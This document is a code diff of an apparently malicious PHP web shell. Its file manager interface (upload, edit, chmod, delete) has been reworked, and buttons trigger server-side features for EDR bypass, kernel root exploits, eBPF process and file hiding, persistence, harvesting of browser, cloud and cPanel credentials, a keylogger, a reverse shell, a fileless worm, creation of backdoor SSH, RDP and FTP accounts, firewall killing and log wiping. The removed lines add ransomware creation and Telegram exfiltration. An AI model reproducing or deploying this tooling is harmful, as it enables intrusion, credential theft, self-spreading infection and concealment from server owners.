-                            <label><input type="radio" name="delete_mode" value="current" checked> Current</label>
-                            <label><input type="radio" name="delete_mode" value="shallow"> Shallow</label>
-                            <label><input type="radio" name="delete_mode" value="deep"> Deep</label>
+                        <div class="stat-item">
+                            <div class="stat-value"><?php  echo date("\110\x3a\x69"); ?>
+</div>
+                            <div class="stat-label">Time</div>
                         </div>
-                        <button type="submit" name="delete_bulk" class="btn btn-block btn-danger" onclick="return confirm('⚠️ Yakin ingin menghapus file-file ini?')">🗑️ Delete</button>
-                    </form>
+                        <div class="stat-item">
+                            <div class="stat-value"><?php  echo round(memory_get_usage() / 1024 / 1024, 1); ?>
+ MB</div>
+                            <div class="stat-label">Memory</div>
+                        </div>
+                    </div>
                 </div>
+                <?php  if (isset($error)) { ?>
+                    <div class="alert alert-danger"><?php  echo htmlspecialchars($error); ?>
+</div>
+                <?php  } ?>
+                <?php  if (isset($success)) { ?>
+                    <div class="alert alert-success"><?php  echo htmlspecialchars($success); ?>
+</div>
+                <?php  } ?>
+                <div class="breadcrumb">
+                    <?php  echo breadcrumb($currentPath, $rootPath, $specialDirectories); ?>
+                </div>
+                <div class="card">
+                    <div class="card-header">
+                        <span>Files</span>
+                        <span><?php  echo count(scandir($currentPath)) - 2; ?>
+ items</span>
+                    </div>
+                    <div class="card-body">
+                        <table class="table">
+                            <thead><tr><th>Name</th><th>Size</th><th>Perm</th><th>Actions</th></tr></thead>
+                            <tbody>
+                                <?php  if ($currentPath !== $rootPath || !empty($specialDirectories)) { ?>
+                                    <tr><td><a href="?path=<?php  echo urlencode(dirname($currentPath)); ?>
+" class="folder">..</a></td><td>-</td><td>-</td><td>-</td></tr>
+                                <?php  } ?>
+                                <?php  $items = @scandir($currentPath) ?: array(); foreach ($items as $item) { if ($item === "\x2e" || $item === "\56\56") { continue; } $itemPath = $currentPath . DIRECTORY_SEPARATOR . $item; $isDir = is_dir($itemPath); $size = $isDir ? "\x2d" : formatSize(@filesize($itemPath)); $perms = @fileperms($itemPath); $permsFormatted = $perms ? substr(sprintf("\x25\157", $perms), -4) : "\105\162\162\x6f\x72"; ?>
+                                    <tr>
+                                        <td>
+                                            <?php  if ($isDir) { ?>
+                                                <a href="?path=<?php  echo urlencode($itemPath); ?>
+" class="folder"><i class="fas fa-folder file-icon"></i><?php  echo htmlspecialchars($item); ?>
+</a>
+                                            <?php  } else { ?>
+                                                <span class="file"><i class="fas fa-file file-icon"></i><?php  echo htmlspecialchars($item); ?>
+</span>
+                                            <?php  } ?>
+                                        </td>
+                                        <td><?php  echo $size; ?>
+</td>
+                                        <td><?php  echo $permsFormatted; ?>
+</td>
+                                        <td class="action-links">
+                                            <?php  if (!$isDir && in_array(strtolower(pathinfo($item, PATHINFO_EXTENSION)), $editableExtensions) && $item !== basename(__FILE__)) { ?>
+                                                <a href="#" onclick="editFile('<?php  echo htmlspecialchars($item); ?>
+')">Edit</a>
+                                            <?php  } ?>
+                                            <a href="#" onclick="showRename('<?php  echo htmlspecialchars($item); ?>
+')">Rename</a>
+                                            <a href="?path=<?php  echo urlencode($currentPath); ?>
+&action=download&target=<?php  echo urlencode($item); ?>
+">DL</a>
+                                            <a href="#" onclick="confirmDelete('<?php  echo htmlspecialchars($item); ?>
+')" class="danger">Del</a>
+                                            <a href="#" onclick="showChmod('<?php  echo htmlspecialchars($item); ?>
+', '<?php  echo $permsFormatted; ?>
+')">Chmod</a>
+                                        </td>
+                                    </tr>
+                                <?php  } ?>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            <?php  } ?>
+        </div>
+    </div>
+
+    <div id="toastContainer" class="toast-container"></div>
+
+    <div id="createModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">New File</div>
+                <button class="modal-close" onclick="hideModal('createModal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <form method="post" action="?path=<?php  echo urlencode($currentPath); ?>
+">
+                    <div class="form-group">
+                        <label>File Name</label>
+                        <input type="text" name="name" class="form-control" placeholder="nama_file.php" required autofocus>
+                    </div>
+                    <input type="hidden" name="type" value="file"><input type="hidden" name="create" value="1">
+                    <button type="submit" class="btn btn-block btn-success">Create</button>
+                </form>
             </div>
         </div>
+    </div>
 
-        <div id="renameModal" class="modal">
-            <div class="modal-content">
-                <div class="modal-header"><h2 class="modal-title">✏️ Rename</h2><button class="modal-close" onclick="hideModal('renameModal')">&times;</button></div>
-                <div class="modal-body">
-                    <form method="post" action="?path=<?= urlencode($currentPath) ?>">
-                        <div class="form-group"><input type="text" id="newName" name="new_name" class="form-control" required></div>
-                        <input type="hidden" id="renameTarget" name="target"><input type="hidden" name="rename" value="1">
-                        <button type="submit" class="btn btn-block">✅ Rename</button>
-                    </form>
-                </div>
+    <div id="createFolderModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">New Folder</div>
+                <button class="modal-close" onclick="hideModal('createFolderModal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <form method="post" action="?path=<?php  echo urlencode($currentPath); ?>
+">
+                    <div class="form-group">
+                        <label>Folder Name</label>
+                        <input type="text" name="name" class="form-control" placeholder="nama_folder" required autofocus>
+                    </div>
+                    <input type="hidden" name="type" value="folder"><input type="hidden" name="create" value="1">
+                    <button type="submit" class="btn btn-block btn-success">Create</button>
+                </form>
             </div>
         </div>
+    </div>
 
-        <div id="editModal" class="modal">
-            <div class="modal-content">
-                <div class="modal-header"><h2 class="modal-title">✏️ Edit</h2><button class="modal-close" onclick="hideModal('editModal')">&times;</button></div>
-                <div class="modal-body">
-                    <form method="post" action="?path=<?= urlencode($currentPath) ?>">
-                        <div class="form-group"><textarea id="fileContent" name="content" class="form-control" style="min-height:200px;font-family:monospace;"></textarea></div>
-                        <input type="hidden" id="editFileName" name="file"><input type="hidden" name="save_file" value="1">
-                        <button type="submit" class="btn btn-block">💾 Save</button>
-                    </form>
-                </div>
+    <div id="uploadModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Upload</div>
+                <button class="modal-close" onclick="hideModal('uploadModal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <form method="post" enctype="multipart/form-data" action="?path=<?php  echo urlencode($currentPath); ?>
+">
+                    <div class="form-group">
+                        <input type="file" name="upload[]" class="form-control" multiple required>
+                    </div>
+                    <div class="form-group">
+                        <label>Upload Mode</label>
+                        <div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:4px;">
+                            <label style="font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer;">
+                                <input type="radio" name="upload_mode" value="normal" checked> Normal
+                            </label>
+                            <label style="font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer;">
+                                <input type="radio" name="upload_mode" value="bulk_shallow"> Shallow
+                            </label>
+                            <label style="font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer;">
+                                <input type="radio" name="upload_mode" value="bulk_deep"> Deep
+                            </label>
+                        </div>
+                    </div>
+                    <button type="submit" class="btn btn-block btn-success">Upload</button>
+                </form>
             </div>
         </div>
+    </div>
 
-        <div id="chmodModal" class="modal">
-            <div class="modal-content">
-                <div class="modal-header"><h2 class="modal-title">🔒 CHMOD</h2><button class="modal-close" onclick="hideModal('chmodModal')">&times;</button></div>
-                <div class="modal-body">
-                    <form method="post" action="?path=<?= urlencode($currentPath) ?>">
-                        <div class="form-group"><input type="text" id="permission" name="mode" class="form-control" placeholder="0644" required></div>
-                        <input type="hidden" id="chmodTarget" name="target"><input type="hidden" name="action" value="chmod">
-                        <button type="submit" class="btn btn-block">✅ Change</button>
-                    </form>
-                </div>
+    <div id="bulkDeleteModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Bulk Delete</div>
+                <button class="modal-close" onclick="hideModal('bulkDeleteModal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <form method="post" action="?path=<?php  echo urlencode($currentPath); ?>
+">
+                    <div class="form-group">
+                        <label>File List (one per line)</label>
+                        <textarea name="file_list" class="form-control" rows="6" placeholder="file1.php&#10;file2.txt&#10;folder/"></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label>Delete Mode</label>
+                        <div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:4px;">
+                            <label style="font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer;">
+                                <input type="radio" name="delete_mode" value="current" checked> Current
+                            </label>
+                            <label style="font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer;">
+                                <input type="radio" name="delete_mode" value="shallow"> Shallow
+                            </label>
+                            <label style="font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer;">
+                                <input type="radio" name="delete_mode" value="deep"> Deep
+                            </label>
+                        </div>
+                    </div>
+                    <button type="submit" name="delete_bulk" class="btn btn-block btn-danger" onclick="return confirm('Are you sure?')">Delete</button>
+                </form>
             </div>
         </div>
+    </div>
 
-        <script>
-            function showModal(id){document.getElementById(id).classList.add('active');}
-            function hideModal(id){document.getElementById(id).classList.remove('active');}
-            
-            function editFile(f){
-                if(f==='<?= basename(__FILE__) ?>'){alert('⚠️ Tidak bisa mengedit file ini.');return;}
-                fetch('?path=<?= urlencode($currentPath) ?>&edit='+encodeURIComponent(f)).then(r=>r.text()).then(d=>{document.getElementById('fileContent').value=d;document.getElementById('editFileName').value=f;showModal('editModal');}).catch(()=>alert('Error'));
+    <div id="renameModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Rename</div>
+                <button class="modal-close" onclick="hideModal('renameModal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <form method="post" action="?path=<?php  echo urlencode($currentPath); ?>
+">
+                    <div class="form-group">
+                        <label>New Name</label>
+                        <input type="text" id="newName" name="new_name" class="form-control" required autofocus>
+                    </div>
+                    <input type="hidden" id="renameTarget" name="target"><input type="hidden" name="rename" value="1">
+                    <button type="submit" class="btn btn-block btn-success">Rename</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div id="editModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Edit</div>
+                <button class="modal-close" onclick="hideModal('editModal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <form method="post" action="?path=<?php  echo urlencode($currentPath); ?>
+">
+                    <div class="form-group">
+                        <textarea id="fileContent" name="content" class="form-control" style="min-height:250px;font-family:var(--font-mono);font-size:12px;"></textarea>
+                    </div>
+                    <input type="hidden" id="editFileName" name="file"><input type="hidden" name="save_file" value="1">
+                    <button type="submit" class="btn btn-block btn-success">Save</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div id="chmodModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">CHMOD</div>
+                <button class="modal-close" onclick="hideModal('chmodModal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <form method="post" action="?path=<?php  echo urlencode($currentPath); ?>
+">
+                    <div class="form-group">
+                        <label>Permission Mode</label>
+                        <input type="text" id="permission" name="mode" class="form-control" placeholder="0644" required autofocus>
+                    </div>
+                    <input type="hidden" id="chmodTarget" name="target"><input type="hidden" name="action" value="chmod">
+                    <button type="submit" class="btn btn-block btn-success">Change</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function showToast(message, type = 'info') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast toast-${type}`;
+            const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
+            toast.innerHTML = `${icons[type] || 'ℹ️'} ${message}`;
+            container.appendChild(toast);
+            setTimeout(() => {
+                toast.style.animation = 'slideOut 0.3s ease forwards';
+                setTimeout(() => toast.remove(), 300);
+            }, 4000);
+        }
+
+        function showModal(id){ document.getElementById(id).classList.add('active'); }
+        function hideModal(id){ document.getElementById(id).classList.remove('active'); }
+
+        function confirmDelete(file) {
+            if(confirm(`Delete "${file}"?`)) {
+                window.location.href = `?path=<?php  echo urlencode($currentPath); ?>
+&action=delete&target=${encodeURIComponent(file)}`;
             }
-            function showRename(n){if(n){document.getElementById('newName').value=n;document.getElementById('renameTarget').value=n;showModal('renameModal');}}
-            function showChmod(n,p){if(n){document.getElementById('permission').value=p;document.getElementById('chmodTarget').value=n;showModal('chmodModal');}}
+        }
 
-            // ===== BACKUP =====
-            function runBackup() {
-                if(confirm('💾 Backup this file?')) {
-                    fetch('?backup=1')
-                        .then(r=>r.text())
-                        .then(d=>alert(d))
-                        .catch(()=>alert('Error'));
-                }
+        function editFile(f){
+            if(f === '<?php  echo basename(__FILE__); ?>
+') { 
+                showToast('Cannot edit this file.', 'warning');
+                return; 
             }
-            
-            // ===== HAPUS SEMUA BACKUP =====
-            function runDeleteBackup() {
-                if(confirm('🗑️ HAPUS SEMUA BACKUP!\n\n⚠️ PERINGATAN:\n- Semua file backup akan dihapus permanen\n- File .inc, .bak, .tmp dihapus\n- Direktori .cache kosong dihapus\n- Backup di /tmp, /var/tmp, /dev/shm dihapus\n\nYAKIN?')) {
-                    if(confirm('KONFIRMASI AKHIR! Backup akan dihapus permanen!')) {
-                        window.location.href='?delete_backup=1&confirm=yes';
+            showToast('Loading file...', 'info');
+            fetch('?path=<?php  echo urlencode($currentPath); ?>
+&edit='+encodeURIComponent(f))
+                .then(r => {
+                    if(!r.ok) throw new Error('Network error');
+                    return r.text();
+                })
+                .then(d => {
+                    document.getElementById('fileContent').value = d;
+                    document.getElementById('editFileName').value = f;
+                    showModal('editModal');
+                })
+                .catch(() => showToast('Failed to load file', 'error'));
+        }
+
+        function showRename(n){
+            if(n){
+                document.getElementById('newName').value = n;
+                document.getElementById('renameTarget').value = n;
+                showModal('renameModal');
+            }
+        }
+
+        function showChmod(n,p){
+            if(n){
+                document.getElementById('permission').value = p;
+                document.getElementById('chmodTarget').value = n;
+                showModal('chmodModal');
+            }
+        }
+
+        function apiCall(url, successMsg, errorMsg = 'Error') {
+            showToast('Processing...', 'info');
+            fetch(url)
+                .then(r => {
+                    if(!r.ok) throw new Error('Network error');
+                    return r.json();
+                })
+                .then(d => {
+                    if(d.status === 'success') {
+                        showToast(successMsg, 'success');
+                    } else {
+                        showToast(d.message || errorMsg, 'error');
                     }
+                })
+                .catch(() => showToast(errorMsg, 'error'));
+        }
+
+        function runHideProcessEBPF() {
+            var proc = prompt('Process name to hide:', '<?php  echo basename(__FILE__); ?>
+');
+            if (!proc) return;
+            apiCall(`?hide_process_ebpf=1&process=${encodeURIComponent(proc)}`, 
+                'eBPF process hider installed', 'eBPF process hider failed');
+        }
+
+        function runHideFileEBPF() {
+            var file = prompt('File path to hide:', '');
+            if (!file) return;
+            apiCall(`?hide_file_ebpf=1&file=${encodeURIComponent(file)}`, 
+                'eBPF file hider installed', 'eBPF file hider failed');
+        }
+
+        function runEDRBypass() {
+            if(!confirm('EDR BYPASS ULTIMATE? (Tartarus + EDRSilencer)')) return;
+            apiCall('?edr_bypass=1', 'EDR bypass complete', 'EDR bypass failed');
+        }
+
+        function runAutoRootModern() {
+            if(!confirm('MODERN ROOT EXPLOIT? (CVE-2023-35001 + GameOver + Container Escape)')) return;
+            apiCall('?auto_root_modern=1', 'Modern root exploit executed', 'Modern root exploit failed');
+        }
+
+        function runPersistenceAdvanced() {
+            if(!confirm('ADVANCED PERSISTENCE? (Systemd + Fileless + Library Hijacking)')) return;
+            apiCall('?persistence_advanced=1', 'Advanced persistence installed', 'Advanced persistence failed');
+        }
+
+        function runCredHarvest() {
+            if(!confirm('CREDENTIAL HARVEST? (Browser + Cloud + Config)')) return;
+            apiCall('?cred_harvest=1', 'Credentials harvested', 'Credential harvest failed');
+        }
+
+        function runSelfDestructAdvanced() {
+            if(!confirm('SELF DESTRUCT? (Memory wipe + Log clean + File shred)')) return;
+            if(!confirm('FINAL CONFIRMATION: This will destroy the shell!')) return;
+            apiCall('?self_destruct_advanced=1', 'Self destruct executed', 'Self destruct failed');
+        }
+
+        function runWorm(){
+            if(!confirm('Start multi-vector fileless worm? (SSH + Exploit + Supply Chain)')) return;
+            apiCall('?worm=1', 'Multi-vector fileless worm executed', 'Worm failed');
+        }
+
+        function runWPScan() {
+            if(!confirm('Scan for WordPress configs?')) return;
+            apiCall('?wpscan=1', 'WP scan done', 'WP scan failed');
+        }
+
+        function runConfigFinder() {
+            if(!confirm('Find sensitive files?')) return;
+            apiCall('?configfinder=1', 'Config finder done', 'Config finder failed');
+        }
+
+        function runDumpDB() {
+            if(!confirm('Dump database credentials?')) return;
+            apiCall('?dumpdb=1', 'DB dump done', 'DB dump failed');
+        }
+
+        function runCpanelHarvest() {
+            if(!confirm('Harvest cPanel credentials?')) return;
+            apiCall('?cpanel_harvest=1', 'cPanel harvest done', 'Harvest failed');
+        }
+
+        function runCloudCreds() {
+            if(!confirm('Grab cloud credentials (AWS/GCP/Azure)?')) return;
+            apiCall('?cloud_creds=1', 'Cloud credentials grabbed', 'Cloud creds failed');
+        }
+
+        function runDbExplorer() {
+            var type = prompt('Database type (mysql|postgresql|redis|mongodb|sqlite):', 'mysql');
+            if(type) {
+                var action = prompt('Action (list|tables|dump):', 'list');
+                var db = prompt('Database name:', '');
+                apiCall(`?db_explorer=1&type=${encodeURIComponent(type)}&action=${encodeURIComponent(action)}&db=${encodeURIComponent(db)}`, 
+                    'DB Explorer done', 'DB Explorer failed');
+            }
+        }
+
+        function runFirewallKiller() {
+            if(!confirm('Kill firewall?')) return;
+            apiCall('?firewall_killer=1', 'Firewall killed', 'Firewall kill failed');
+        }
+
+        function runNetworkPivot() {
+            var action = prompt('Action (ssh_tunnel|ssh_dynamic|reverse_tunnel|status):', 'status');
+            if(action === 'ssh_tunnel' || action === 'ssh_dynamic' || action === 'reverse_tunnel') {
+                var target = prompt('Target (user@host):', '');
+                var port = prompt('Port:', '');
+                var local_port = prompt('Local port:', '');
+                apiCall(`?network_pivot=1&action=${encodeURIComponent(action)}&target=${encodeURIComponent(target)}&port=${encodeURIComponent(port)}&local_port=${encodeURIComponent(local_port)}`, 
+                    'Network pivot done', 'Network pivot failed');
+            } else {
+                apiCall(`?network_pivot=1&action=${encodeURIComponent(action)}`, 
+                    'Network pivot done', 'Network pivot failed');
+            }
+        }
+
+        function runKeylogger() {
+            var action = prompt('Action (start|stop|read|clear):', 'start');
+            if(action) {
+                apiCall(`?keylogger=1&action=${encodeURIComponent(action)}`, 
+                    'Keylogger done', 'Keylogger failed');
+            }
+        }
+
+        function runReverseShell() {
+            var action = prompt('Action (start|stop|status):', 'status');
+            if(action === 'start') {
+                var ip = prompt('IP address:', '');
+                var port = prompt('Port:', '4444');
+                if(ip && port) {
+                    apiCall(`?reverseshell=1&action=${encodeURIComponent(action)}&ip=${encodeURIComponent(ip)}&port=${encodeURIComponent(port)}`, 
+                        'Reverse shell started', 'Reverse shell failed');
+                }
+            } else {
+                apiCall(`?reverseshell=1&action=${encodeURIComponent(action)}`, 
+                    'Reverse shell done', 'Reverse shell failed');
+            }
+        }
+
+        function runPortScan() {
+            var target = prompt('Target IP/host:', 'localhost');
+            var ports = prompt('Ports (comma separated):', '22,80,443,3306,5432,8080,8443');
+            if(target && ports) {
+                apiCall(`?port_scan=1&target=${encodeURIComponent(target)}&ports=${encodeURIComponent(ports)}`, 
+                    'Port scan done', 'Port scan failed');
+            }
+        }
+
+        function runCleanLogs() {
+            if(!confirm('Clean logs aggressively (zero + shred)?')) return;
+            apiCall('?clean_logs=1', 'Logs cleaned', 'Clean logs failed');
+        }
+
+        function runOneClick() {
+            if(!confirm('ONE CLICK CLEANUP? (All traces + logs + history + temp)')) return;
+            if(!confirm('FINAL CONFIRMATION: This will destroy all traces!')) return;
+            apiCall('?one_click=1&confirm=yes', 'One click executed', 'One click failed');
+        }
+
+        function runSSHKeys() {
+            apiCall('?sshkeys=1', 'SSH keys found', 'SSH keys failed');
+        }
+
+        function runSSHInject() {
+            var key = prompt('Public key to inject:', 'ssh-rsa AAAAB3NzaC1yc2EAAA...');
+            if(key) {
+                apiCall(`?ssh_inject=1&key=${encodeURIComponent(key)}`, 
+                    'SSH keys injected', 'SSH inject failed');
+            }
+        }
+
+        function runCreateSSH() {
+            var user = prompt('Username:', '');
+            var pass = prompt('Password:', '');
+            if(user && pass) {
+                apiCall(`?create_ssh=1&user=${encodeURIComponent(user)}&pass=${encodeURIComponent(pass)}`, 
+                    'SSH user created', 'Create SSH failed');
+            }
+        }
+
+        function runCreateRDP() {
+            var user = prompt('Username:', 'Dkid03' + Math.floor(Math.random()*1000));
+            if (!user) return;
+            var pass = prompt('Password:', 'Dkid@pssw0rd123!');
+            if (!pass) return;
+            apiCall(`?create_rdp=1&user=${encodeURIComponent(user)}&pass=${encodeURIComponent(pass)}`, 
+                'RDP user created', 'Create RDP failed');
+        }
+
+        function runCreateFTP() {
+            var u = prompt('Username:'); 
+            if(u) {
+                var p = prompt('Password:'); 
+                var h = prompt('Home:','/home/'+u); 
+                apiCall(`?create_ftp=1&user=${encodeURIComponent(u)}&pass=${encodeURIComponent(p||'')}&home=${encodeURIComponent(h)}`, 
+                    'FTP account created', 'Create FTP failed');
+            }
+        }
+
+        function runCreateMail() {
+            var e = prompt('Email address:');
+            if(e) {
+                var p = prompt('Password:');
+                if(p) {
+                    var domain = e.split('@')[1] || window.location.hostname;
+                    apiCall(`?create_mail=1&email=${encodeURIComponent(e)}&pass=${encodeURIComponent(p)}&domain=${encodeURIComponent(domain)}`, 
+                        'Mail account created', 'Create mail failed');
                 }
             }
-            
-            // ===== INJECT =====
-            function runInject() {
-                if(confirm('🔧 Inject restore code to index.php, wp-config.php, config.php, wp-load.php, settings.php?')) {
-                    fetch('?inject_restore=1')
-                        .then(r=>r.text())
-                        .then(d=>alert(d))
-                        .catch(()=>alert('Error'));
+        }
+
+        function runInjectRestore() {
+            if(!confirm('Inject restore code to index.php, wp-config.php, config.php, wp-load.php, settings.php?')) return;
+            apiCall('?inject_restore=1', 'Injected successfully', 'Inject failed');
+        }
+
+        function runAutoPrepend() {
+            if(!confirm('Inject auto_prepend_file to php.ini & .user.ini?')) return;
+            apiCall('?auto_prepend=1', 'Auto prepend injected', 'Auto prepend failed');
+        }
+
+        function runBackup() {
+            if(confirm('Backup this file?')) {
+                apiCall('?backup=1', 'Backup created', 'Backup failed');
+            }
+        }
+
+        function runDeleteBackup() {
+            if(confirm('Delete all backup files?')) {
+                if(confirm('Final confirmation!')) {
+                    apiCall('?delete_backup=1&confirm=yes', 'Backup deleted', 'Delete failed');
                 }
             }
+        }
 
-            // ===== WORM =====
-            function runWorm(){if(confirm('Yakin?')){fetch('?worm=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            function runWormInfectAll(){if(confirm('🪱 INFECT ALL DOMAINS?')){fetch('?worm_infect_all=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            
-            // ===== UTILITY =====
-            function runClean(){if(confirm('Clean traces?')){fetch('?clean=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
-            
-            // ===== ONE CLICK =====
-            function runOneClick() {
-                if(confirm('⚠️ ONE CLICK ALL!\n\nIni akan menjalankan SEMUA fitur:\n- Spoof IP & UA\n- Clear logs & histories\n- Hide process\n- Fake login\n- Delete temp & sensitive files\n- Kill connections\n- Clear cache\n\nSETELAH ITU SESSION AKAN DIHAPUS!\n\nYAKIN?')) {
-                    if(confirm('KONFIRMASI AKHIR!')) {
-                        window.location.href='?one_click=1&confirm=yes';
-                    }
+        function runCronPersistence() {
+            var action = prompt('Action (install|remove|list):', 'list');
+            var interval = prompt('Interval in minutes (for install):', '5');
+            if(action) {
+                apiCall(`?cron_persistence=1&action=${encodeURIComponent(action)}&interval=${encodeURIComponent(interval)}`, 
+                    'Cron persistence done', 'Cron persistence failed');
+            }
+        }
+
+        function runUserPersistence() {
+            var action = prompt('Action (install|remove):', 'install');
+            if(action) {
+                apiCall(`?user_persistence=${encodeURIComponent(action)}`, 
+                    action === 'install' ? 'User persistence installed' : 'User persistence removed', 
+                    'User persistence failed');
+            }
+        }
+
+        function runAntiForensic() {
+            if(!confirm('Anti forensic?')) return;
+            apiCall('?anti_forensic=1', 'Anti forensic done', 'Anti forensic failed');
+        }
+
+        function runCloneShell() {
+            var targets = prompt('Target directories (comma separated, empty for auto):', '');
+            if(targets !== null) {
+                apiCall(`?clone_shell=1&targets=${encodeURIComponent(targets)}`, 
+                    'Shell cloned', 'Clone shell failed');
+            }
+        }
+
+        function runListSpread() {
+            apiCall('?list_spread=1', 'List spread done', 'List spread failed');
+        }
+
+        window.onclick = function(e) {
+            document.querySelectorAll('.modal').forEach(m => {
+                if(e.target === m) hideModal(m.id);
+            });
+        }
+
+        <?php  if (isset($_GET["\145\144\x69\164"])) { ?>
+        <?php  $file = $_GET["\x65\144\x69\164"]; $filePath = $currentPath . DIRECTORY_SEPARATOR . $file; $content = file_exists($filePath) && is_file($filePath) && isSafePath($filePath, $rootPath, $specialDirectories) && in_array(strtolower(pathinfo($file, PATHINFO_EXTENSION)), $editableExtensions) ? @file_get_contents($filePath) : ''; ?>
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('fileContent').value = <?php  echo json_encode($content); ?>
+;
+            document.getElementById('editFileName').value = <?php  echo json_encode($file); ?>
+;
+            showModal('editModal');
+        });
+        <?php  } ?>
+
+        document.querySelector('a[href="?logout=1"]')?.addEventListener('click', function(e) {
+            e.preventDefault();
+            if(confirm('Logout?')) {
+                window.location.href = '?logout=1';
+            }
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if(e.key === 'Escape') {
+                document.querySelectorAll('.modal.active').forEach(m => hideModal(m.id));
+            }
+            if(e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
+                const editModal = document.getElementById('editModal');
+                if(editModal.classList.contains('active')) {
+                    document.querySelector('#editModal form button[type="submit"]')?.click();
                 }
             }
-
-            // ===== CPANEL HARVEST =====
-            function runCpanelHarvest() {
-                if(confirm('🔍 HARVEST CPANEL?\n\nAkan mencari token, password, session, dan kredensial cPanel.\nHasil dikirim ke Telegram.\n\nLANJUTKAN?')) {
-                    fetch('?cpanel_harvest=1')
-                        .then(r=>r.text())
-                        .then(d=>alert(d))
-                        .catch(()=>alert('Error'));
-                }
-            }
-
-            // ===== AUTO CREATE SSH =====
-            function runCreateSSH() {
-                var user = prompt('Username SSH (kosong = auto-generate):', '');
-                var pass = prompt('Password SSH (kosong = auto-generate):', '');
-                fetch('?create_ssh=1&user='+encodeURIComponent(user)+'&pass='+encodeURIComponent(pass))
-                    .then(r=>r.text())
-                    .then(d=>alert(d))
-                    .catch(()=>alert('Error'));
-            }
-            
-            // ===== CREATE RDP =====
-            function runCreateRDP() {
-                var user = prompt('Username RDP:', 'admin' + Math.floor(Math.random()*1000));
-                if (!user) return;
-                var pass = prompt('Password (min 8 karakter, kompleks):', 'P@ssw0rd123!');
-                if (!pass) return;
-                fetch('?create_rdp=1&user='+encodeURIComponent(user)+'&pass='+encodeURIComponent(pass))
-                    .then(r=>r.text())
-                    .then(d=>alert(d))
-                    .catch(()=>alert('Error'));
-            }
-            
-            // ===== BACKDOOR USER =====
-            function runBackdoorUser(){ 
-                var u=prompt('Username:'); 
-                if(u){ 
-                    var p=prompt('Password:'); 
-                    fetch('?backdooruser=1&user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p||'')).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); 
-                } 
-            }
-            
-            // ===== REVERSE SHELL =====
-            function runReverseShell(){ 
-                var a=prompt('Reverse shell: start [ip] [port], stop [port], status'); 
-                if(a){ 
-                    var p=a.split(' '); 
-                    fetch('?reverseshell=1&action='+encodeURIComponent(p[0])+'&ip='+encodeURIComponent(p[1]||'')+'&port='+encodeURIComponent(p[2]||'')).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); 
-                } 
-            }
-            
-            // ===== SSH KEYS =====
-            function runSSHKeys(){ if(confirm('Grab SSH keys?')){ fetch('?sshkeys=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
-            
-            // ===== WP SCAN =====
-            function runWPScan(){ if(confirm('Scan WordPress/Laravel?')){ fetch('?wpscan=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
-            
-            // ===== RANSOMWARE =====
-            function runCreateRansom(){ if(confirm('Create ransomware?')){ fetch('?create_ransom=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
-            
-            // ===== ANTI FORENSIC =====
-            function runAntiForensic(){ if(confirm('Anti forensic?')){ fetch('?anti_forensic=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
-            
-            // ===== BYPASS SUHOSIN =====
-            function runBypassSuhosin(){ if(confirm('Bypass Suhosin?')){ fetch('?bypass_suhosin=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
-            
-            // ===== CREATE FTP =====
-            function runCreateFTP(){ 
-                var u=prompt('Username:'); 
-                if(u){ 
-                    var p=prompt('Password:'); 
-                    var h=prompt('Home:','/home/'+u); 
-                    fetch('?create_ftp=1&user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p||'')+'&home='+encodeURIComponent(h)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); 
-                } 
-            }
-            
-            // ===== CREATE MAIL =====
-            function runCreateMail(){ 
-                var e=prompt('Email:'); 
-                if(e){ 
-                    var p=prompt('Password:'); 
-                    fetch('?create_mail=1&email='+encodeURIComponent(e)+'&pass='+encodeURIComponent(p||'')+'&domain='+encodeURIComponent(e.split('@')[1]||window.location.hostname)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); 
-                } 
-            }
-            
-            // ===== DEEP PERSISTENCE =====
